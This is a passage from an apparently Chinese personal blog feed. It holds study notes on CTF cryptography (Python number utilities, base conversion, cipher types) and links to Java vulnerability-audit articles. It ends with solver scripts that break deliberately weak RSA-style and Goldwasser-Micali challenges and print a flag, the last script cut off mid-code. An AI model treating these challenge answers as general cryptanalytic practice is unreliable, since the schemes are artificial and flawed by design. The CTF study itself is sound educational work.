<a href="https://www.anquanke.com/post/id/199481" target="_blank" rel="noopener">https://www.anquanke.com/post/id/199481</a></p><p>审计mybatis的sql注入  <a href="http://xdxd.love/2016/03/14/" target="_blank" rel="noopener">http://xdxd.love/2016/03/14/</a></p><p>RMI-反序列化  <a href="https://xz.aliyun.com/t/6660" target="_blank" rel="noopener">https://xz.aliyun.com/t/6660</a></p><p>SpEL表达式注入漏洞  <a href="https://www.jianshu.com/p/ce4ac733a4b9" target="_blank" rel="noopener">https://www.jianshu.com/p/ce4ac733a4b9</a></p><p>一篇文章读懂Java代码审计之XXE  <a href="https://samny.blog.csdn.net/article/details/104426472" target="_blank" rel="noopener">https://samny.blog.csdn.net/article/details/104426472</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>best_CRYPTO</title>
      <link href="/2020/05/07/best-crypto/"/>
      <url>/2020/05/07/best-crypto/</url>
      
        <content type="html"><![CDATA[<p>密码学需要数论的知识，一切都要从头开始。</p><h1 id="1-crypto基础"><a href="#1-crypto基础" class="headerlink" title="1. crypto基础"></a>1. crypto基础</h1><h2 id="1-1-python的模块介绍"><a href="#1-1-python的模块介绍" class="headerlink" title="1.1  python的模块介绍"></a>1.1  python的模块介绍</h2><h3 id="1-1-1-binascii模块"><a href="#1-1-1-binascii模块" class="headerlink" title="1.1.1  binascii模块"></a>1.1.1  binascii模块</h3><p>binascii模块用于在二进制和ASCII之间转换</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span> <span class="token keyword">import</span> binascii<span class="token comment" spellcheck="true"># 将bytes类型的字符串对象转ascii并用十六进制表示</span><span class="token operator">>></span> str1 <span class="token operator">=</span> b<span class="token string">"hello world"</span>  <span class="token operator">>></span> binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span>b<span class="token string">"hello world"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 输出 b'68656c6c6f20776f726c64'</span><span class="token comment" spellcheck="true"># 相反操作</span><span class="token operator">>></span> binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>b<span class="token string">'68656c6c6f20776f726c64'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 输出b'hello world'</span><span class="token operator">>></span> binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>b<span class="token string">"hello world"</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 注解： 同b2a_hex(), 返回bytes类型的字符串对象data 的十六进制表示。 data 的每个字节都转换为相应的2位十六进制表示。因此返回的字节对象的长度是 data 的长度的两倍。</span><span class="token comment" spellcheck="true"># 输出 b'68656c6c6f20776f726c64'</span><span class="token operator">>></span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>b<span class="token string">'68656c6c6f20776f726c64'</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 注解： 同a2b_hex(), 返回由十六进制字符串 hexstr 表示的bytes类型的字符串对象。 hexstr 必须包含偶数个十六进制数字（可以是大写或小写），否则会引发 Error 异常。</span><span class="token comment" spellcheck="true"># 输出b'hello world'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-1-2-math模块"><a href="#1-1-2-math模块" class="headerlink" title="1.1.2  math模块"></a>1.1.2  math模块</h3><p><strong>参考资料：</strong></p><p><strong>1、</strong>Python math 模块与 cmath 模块  <a href="https://www.runoob.com/w3cnote/python-math-and-cmath-module.html" target="_blank" rel="noopener">https://www.runoob.com/w3cnote/python-math-and-cmath-module.html</a></p><h4 id="1-1-2-1-math-gcd"><a href="#1-1-2-1-math-gcd" class="headerlink" title="1.1.2.1  math.gcd"></a>1.1.2.1  <strong>math.gcd</strong></h4><p>求两个数的最大公约数</p><pre><code>&gt;&gt;&gt; import math&gt;&gt;&gt; math.gcd(948946465,454545)5</code></pre><h4 id="1-1-2-2-math-log和math-log10"><a href="#1-1-2-2-math-log和math-log10" class="headerlink" title="1.1.2.2  math.log和math.log10"></a>1.1.2.2  math.log和math.log10</h4><p><code>math.log(x)</code> 就相当于数学中的<code>ln(x)</code>，x&gt;0，求底数为e的对数，e = 2.718281828459；</p><p><code>math.log10(x)</code> 就相当于数学中的<code>lg(x)</code>，x&gt;0，求底数为10的对数；</p><p><strong>用法如下：</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> mathmath<span class="token punctuation">.</span>log<span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token punctuation">,</span> base<span class="token punctuation">]</span><span class="token punctuation">)</span>x <span class="token operator">-</span><span class="token operator">-</span> 数值表达式。base <span class="token operator">-</span><span class="token operator">-</span> 可选，底数，默认为 e。 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-1-3-libnum模块"><a href="#1-1-3-libnum模块" class="headerlink" title="1.1.3  libnum模块"></a>1.1.3  libnum模块</h3><p>参考资料：</p><p><strong>1、</strong>libnum, 使用数字( 素数，模块，等等 )  <a href="https://www.kutu66.com/GitHub/article_99877" target="_blank" rel="noopener">https://www.kutu66.com/GitHub/article_99877</a> </p><p>可以使用libnum模块下的gcd，xgcd</p><h3 id="1-1-4-gmpy2模块"><a href="#1-1-4-gmpy2模块" class="headerlink" title="1.1.4  gmpy2模块"></a>1.1.4  gmpy2模块</h3><h3 id="1-1-5-Crypto-Util模块"><a href="#1-1-5-Crypto-Util模块" class="headerlink" title="1.1.5  Crypto.Util模块"></a>1.1.5  Crypto.Util模块</h3><h4 id="1-1-5-1-bytes-to-long"><a href="#1-1-5-1-bytes-to-long" class="headerlink" title="1.1.5.1 bytes_to_long"></a>1.1.5.1 bytes_to_long</h4><p>字节类型转为10进制</p><pre><code>&gt;&gt;&gt; from Crypto.Util.number import *&gt;&gt;&gt; bytes_to_long(b&quot;flag&quot;)1718378855</code></pre><h4 id="1-1-5-2-long-to-bytes"><a href="#1-1-5-2-long-to-bytes" class="headerlink" title="1.1.5.2 long_to_bytes"></a>1.1.5.2 long_to_bytes</h4><p>10进制转为字节类型</p><pre><code>&gt;&gt;&gt; from Crypto.Util.number import *&gt;&gt;&gt; long_to_bytes(&quot;1718378855&quot;)b&#39;flag&#39;</code></pre><h4 id="1-1-5-3-getPrime"><a href="#1-1-5-3-getPrime" class="headerlink" title="1.1.5.3 getPrime"></a>1.1.5.3 getPrime</h4><h3 id="1-1-6-random模块"><a href="#1-1-6-random模块" class="headerlink" title="1.1.6  random模块"></a>1.1.6  random模块</h3><h2 id="1-2-基础运算掌握"><a href="#1-2-基础运算掌握" class="headerlink" title="1.2  基础运算掌握"></a>1.2  基础运算掌握</h2><h3 id="1-2-1-进制转化"><a href="#1-2-1-进制转化" class="headerlink" title="1.2.1  进制转化"></a>1.2.1  进制转化</h3><h4 id="16进制与字符串互转"><a href="#16进制与字符串互转" class="headerlink" title="16进制与字符串互转"></a><strong>16进制与字符串互转</strong></h4><pre><code>python2下：&gt;&gt;&gt; b&#39;user&#39;.encode(&#39;hex&#39;)    #字符串转为16进制&#39;75736572&#39;&gt;&gt;&gt; &#39;75736572&#39;.decode(&#39;hex&#39;)    #16进制转为字符串&#39;user&#39;-----------------------------------------------------------------------------------------python3下：&#39;&#39;.join([hex(ord(c)).replace(&#39;0x&#39;,&#39;&#39;) for c in &quot;user&quot;])    #字符串转为16进制&gt;&gt;&gt; import binascii&gt;&gt;&gt; binascii.unhexlify(&#39;75736572&#39;).decode(&#39;utf8&#39;)    #16进制转为字符串-----------------------------------------------------------------------------------------bytearray类型互转python3下：&gt;&gt;&gt; bytes.fromhex(&#39;deadbeef&#39;)b&#39;\xde\xad\xbe\xef&#39;    #字符串转为16进制&gt;&gt;&gt; b&#39;\xde\xad\xbe\xef&#39;.hex()    &#39;deadbeef&#39;    #16进制转为字符串</code></pre><h4 id="16进制与10进制互转"><a href="#16进制与10进制互转" class="headerlink" title="16进制与10进制互转"></a>16进制与10进制互转</h4><pre><code>python2下：&gt;&gt;&gt; int(0xccccccccc)54975581388L&gt;&gt;&gt; hex(54975581388)&#39;0xcccccccccL&#39;-----------------------------------------------------------------------------------------python3下：&gt;&gt;&gt; int(&quot;66&quot;,16)102&gt;&gt;&gt; hex(102)&#39;0x66&#39;</code></pre><h2 id="1-3-数论知识"><a href="#1-3-数论知识" class="headerlink" title="1.3  数论知识"></a>1.3  数论知识</h2><h3 id="1-3-1-离散对数"><a href="#1-3-1-离散对数" class="headerlink" title="1.3.1  离散对数"></a>1.3.1  离散对数</h3><p>构造公钥算法</p><p><strong>参考资料：</strong></p><p><strong>1、</strong>数论简介以及公钥密码  <a href="https://wenku.baidu.com/view/fa4370ccb42acfc789eb172ded630b1c58ee9b00.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/fa4370ccb42acfc789eb172ded630b1c58ee9b00.html</a></p><h2 id="1-4-密码学知识"><a href="#1-4-密码学知识" class="headerlink" title="1.4  密码学知识"></a>1.4  密码学知识</h2><h3 id="1-4-1-密码类型"><a href="#1-4-1-密码类型" class="headerlink" title="1.4.1  密码类型"></a>1.4.1  密码类型</h3><p><strong>参考资料：</strong></p><p><strong>1、</strong>CTF——常见密码    <a href="https://blog.csdn.net/vhkjhwbs/article/details/99692399" target="_blank" rel="noopener">https://blog.csdn.net/vhkjhwbs/article/details/99692399</a></p><h4 id="1-4-1-1-曼彻斯特编码"><a href="#1-4-1-1-曼彻斯特编码" class="headerlink" title="1.4.1.1  曼彻斯特编码"></a>1.4.1.1  曼彻斯特编码</h4><p><strong>参考资料：</strong></p><p><strong>1、</strong>差分曼彻斯特编码  <a href="https://baike.baidu.com/item/%E5%B7%AE%E5%88%86%E6%9B%BC%E5%BD%BB%E6%96%AF%E7%89%B9%E7%BC%96%E7%A0%81/7486879?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/%E5%B7%AE%E5%88%86%E6%9B%BC%E5%BD%BB%E6%96%AF%E7%89%B9%E7%BC%96%E7%A0%81/7486879?fr=aladdin</a></p><p><strong>2、</strong>曼彻斯特编码  <a href="https://baike.baidu.com/item/%E6%9B%BC%E5%BD%BB%E6%96%AF%E7%89%B9%E7%BC%96%E7%A0%81/8902319?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/%E6%9B%BC%E5%BD%BB%E6%96%AF%E7%89%B9%E7%BC%96%E7%A0%81/8902319?fr=aladdin</a></p><h4 id="1-4-1-2-仿射密码"><a href="#1-4-1-2-仿射密码" class="headerlink" title="1.4.1.2  仿射密码"></a>1.4.1.2  仿射密码</h4><p><strong>参考资料：</strong></p><p><strong>1、</strong>信息安全–仿射密码     <a href="https://www.cnblogs.com/zishu/p/8650214.html" target="_blank" rel="noopener">https://www.cnblogs.com/zishu/p/8650214.html</a></p><h4 id="1-4-1-3-AES"><a href="#1-4-1-3-AES" class="headerlink" title="1.4.1.3  AES"></a>1.4.1.3  AES</h4><h2 id="1-5-工具"><a href="#1-5-工具" class="headerlink" title="1.5  工具"></a>1.5  工具</h2><h3 id="1-5-1-website"><a href="#1-5-1-website" class="headerlink" title="1.5.1  website"></a>1.5.1  website</h3><p><strong>1、</strong>进制转化：<a href="https://tool.lu/hexconvert/" target="_blank" rel="noopener">https://tool.lu/hexconvert/</a></p><p><strong>2、</strong>仿射密码解密：<a href="https://blog.csdn.net/x_yhy/article/details/83756908" target="_blank" rel="noopener">https://blog.csdn.net/x_yhy/article/details/83756908</a></p><h3 id="1-5-2-sage"><a href="#1-5-2-sage" class="headerlink" title="1.5.2  sage"></a>1.5.2  sage</h3><p><strong>参考资料：</strong></p><p><strong>1、</strong>mirror of SageMath  <a href="http://mirror.hust.edu.cn/sagemath/win/index.html" target="_blank" rel="noopener">http://mirror.hust.edu.cn/sagemath/win/index.html</a></p><p><strong>2、</strong>SageMath折腾笔记  <a href="https://www.jianshu.com/p/11030ad97edd" target="_blank" rel="noopener">https://www.jianshu.com/p/11030ad97edd</a></p><p><strong>3、</strong>使用SageMath  <a href="https://www.jianshu.com/p/ddf9376334cd" target="_blank" rel="noopener">https://www.jianshu.com/p/ddf9376334cd</a></p><p><strong>4、</strong>github下的项目  <a href="https://github.com/sagemath" target="_blank" rel="noopener">https://github.com/sagemath</a></p><h1 id="2-crypto进阶"><a href="#2-crypto进阶" class="headerlink" title="2.  crypto进阶"></a>2.  crypto进阶</h1><h2 id="2-1-crypto-type"><a href="#2-1-crypto-type" class="headerlink" title="2.1  crypto_type"></a>2.1  crypto_type</h2><h3 id="2-1-1-LFSR"><a href="#2-1-1-LFSR" class="headerlink" title="2.1.1  LFSR"></a>2.1.1  LFSR</h3><p><strong>参考资料：</strong></p><p><strong>1、</strong>深入分析CTF中的LFSR类题目（一）  <a href="https://www.anquanke.com/post/id/181811" target="_blank" rel="noopener">https://www.anquanke.com/post/id/181811</a></p><h1 id="3-真题"><a href="#3-真题" class="headerlink" title="3. 真题"></a>3. 真题</h1><h2 id="3-1-easy-prime（2020HK）"><a href="#3-1-easy-prime（2020HK）" class="headerlink" title="3.1  easy_prime（2020HK）"></a>3.1  easy_prime<code>（2020HK）</code></h2><p><strong>参考资料：</strong></p><p><strong>1、</strong>Compute the modular inverse using Extended GCD <a href="https://takp.me/posts/compute-the-modular-inverse-using-extended-gcd/" target="_blank" rel="noopener">https://takp.me/posts/compute-the-modular-inverse-using-extended-gcd/</a> </p><p><strong>2、</strong>writeup：<a href="https://docs.qq.com/doc/DWnZCcG1tRENLc2ZJ?ADUIN=760244369&amp;ADSESSION=1588816399&amp;ADTAG=CLIENT.QQ.5689_.0&amp;ADPUBNO=26982&amp;jumpuin=760244369" target="_blank" rel="noopener">https://docs.qq.com/doc/DWnZCcG1tRENLc2ZJ?ADUIN=760244369&amp;ADSESSION=1588816399&amp;ADTAG=CLIENT.QQ.5689_.0&amp;ADPUBNO=26982&amp;jumpuin=760244369</a></p><p><strong>3、</strong> <a href="http://anh.cs.luc.edu/331/code/xgcd.py" target="_blank" rel="noopener">http://anh.cs.luc.edu/331/code/xgcd.py</a> </p><p><strong>题目源码：</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*-coding:utf-8-*-</span><span class="token keyword">import</span> gmpy<span class="token keyword">import</span> binascii<span class="token keyword">from</span> flag <span class="token keyword">import</span> generateN<span class="token punctuation">,</span>flag<span class="token keyword">assert</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"l3hsec{"</span><span class="token punctuation">)</span><span class="token keyword">assert</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"}"</span><span class="token punctuation">)</span>ns <span class="token operator">=</span> generateN<span class="token punctuation">(</span><span class="token punctuation">)</span>cs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">4</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> flag<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token punctuation">:</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#六位六位的取</span>    tmp <span class="token operator">=</span> int<span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#转化为10进制</span>    <span class="token keyword">assert</span><span class="token punctuation">(</span>cs<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> pow<span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> ns<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> ns<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    cs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pow<span class="token punctuation">(</span>tmp<span class="token punctuation">,</span>ns<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>ns<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"output.txt"</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>ns<span class="token punctuation">,</span>cs<span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现任何两数之间gcd为质数，而且每个数恰好可以分解为4个质数，其中3个分别为与另外三个数的gcd。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> binascii <span class="token keyword">import</span> unhexlify<span class="token keyword">from</span> math <span class="token keyword">import</span> gcd<span class="token keyword">def</span> <span class="token function">xgcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""return (g, x, y) such that a*x + b*y = g = gcd(a, b)"""</span>    x0<span class="token punctuation">,</span> x1<span class="token punctuation">,</span> y0<span class="token punctuation">,</span> y1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span>    <span class="token keyword">while</span> a <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        q<span class="token punctuation">,</span> b<span class="token punctuation">,</span> a <span class="token operator">=</span> b <span class="token operator">//</span> a<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b <span class="token operator">%</span> a        y0<span class="token punctuation">,</span> y1 <span class="token operator">=</span> y1<span class="token punctuation">,</span> y0 <span class="token operator">-</span> q <span class="token operator">*</span> y1        x0<span class="token punctuation">,</span> x1 <span class="token operator">=</span> x1<span class="token punctuation">,</span> x0 <span class="token operator">-</span> q <span class="token operator">*</span> x1    <span class="token keyword">return</span> b<span class="token punctuation">,</span> x0<span class="token punctuation">,</span> y0  ns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">953132552494206303012348408786397717024120659325268233076680572604098697916168653385278329626313598614575680244228262381838389535120393085942673903070279570977485804095602878303285246022965401</span><span class="token punctuation">,</span><span class="token number">928899805423663693755492479177957865905961060276268728972280982039567441748465598294920208045639197902961091811958507823621118746074321384648224862021550115947173362257238535782360979512361361</span><span class="token punctuation">,</span><span class="token number">1895738273463929341726412801769343217490103177236215681995039530128910586382946463987512006062214032212349782024052291872703750294681228486109434492925512597572002557806018748292562823816843093</span><span class="token punctuation">,</span><span class="token number">1448313587366097491833529009986157413051969214099716038535604941172227859771995540645489672258057853586671280309005918618953394042015498627203762570380266032321857607975754833498540829298169607</span><span class="token punctuation">]</span>cs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">118970773770344149378137341138460281980614648083634897295967396676206557791102621552814126443049906530099386964179536465419908480994368590471625018267397766213154343646841600359013258748442316</span><span class="token punctuation">,</span><span class="token number">238145257463910641951794768672569246985352083467488967568898082691705991421406969804917855770249818513742336674371599634613178449130135856057919373672907551727301704055321750764127345574615552</span><span class="token punctuation">,</span> <span class="token number">657389389929881515388804420340482663287459042406748890285487483823807180002929633118827932943572291652551479200658771932105578947351729394654311493345963189287566901642275715408746374413837177</span><span class="token punctuation">,</span><span class="token number">301848095091025953366454273747079605738957961883101530616601599039001385197654325158243724195165713204983805206548426107367727947468939581279543279719269482191430165339268214674606485978855583</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token punctuation">[</span>gcd<span class="token punctuation">(</span>ns<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ns<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> gcd<span class="token punctuation">(</span>ns<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ns<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> gcd<span class="token punctuation">(</span>ns<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ns<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> gcd<span class="token punctuation">(</span>ns<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ns<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> gcd<span class="token punctuation">(</span>ns<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ns<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> gcd<span class="token punctuation">(</span>ns<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ns<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true"># print(p)</span>fac <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token punctuation">[</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> p<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ns<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">//</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>p<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> p<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> p<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ns<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">//</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span>p<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">*</span>p<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> p<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> p<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ns<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">//</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>p<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">*</span>p<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>p<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> p<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> p<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ns<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">//</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">*</span>p<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">*</span>p<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d <span class="token operator">=</span> fac<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>fac<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    x <span class="token operator">=</span> xgcd<span class="token punctuation">(</span>a<span class="token operator">*</span>b<span class="token operator">*</span>c<span class="token operator">*</span>d<span class="token operator">-</span><span class="token punctuation">(</span>a<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>b<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>c<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>d<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>a<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>b<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>c<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>d<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>unhexlify<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>pow<span class="token punctuation">(</span>cs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> x<span class="token punctuation">,</span> ns<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#l3hsec{Pr1me_i5_50_fun!}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-2-gm（2020HF）"><a href="#3-2-gm（2020HF）" class="headerlink" title="3.2  gm（2020HF）"></a>3.2  gm<code>（2020HF）</code></h2><p>其实只是知道了这个是挺标准的GM加密<br>然后谷歌找了半天资料，最后找到了一个简单的脚本：</p><p><a href="https://github.com/ctfs/write-ups-2015/tree/master/asis-quals-ctf-2015/crypto/golden-metal" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2015/tree/master/asis-quals-ctf-2015/crypto/golden-metal</a><br>简单地算一下p和q的值，一套就出来了，大佬tql</p><p><strong>参考资料：</strong></p><p><strong>1、</strong>原题：<a href="https://ctftime.org/writeup/16120" target="_blank" rel="noopener">https://ctftime.org/writeup/16120</a></p><p><strong>2、</strong>writeup：<a href="https://mi1itray_axe.gitee.io/2020/04/20/GM-crypto-system/" target="_blank" rel="noopener">https://mi1itray_axe.gitee.io/2020/04/20/GM-crypto-system/</a></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> sympy<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>final_content <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'output'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> e<span class="token punctuation">:</span>    content <span class="token operator">=</span> e<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    list_content <span class="token operator">=</span> content<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> list_content<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># print(i.replace(']','').replace('[',''))</span>        final_content<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">']'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token 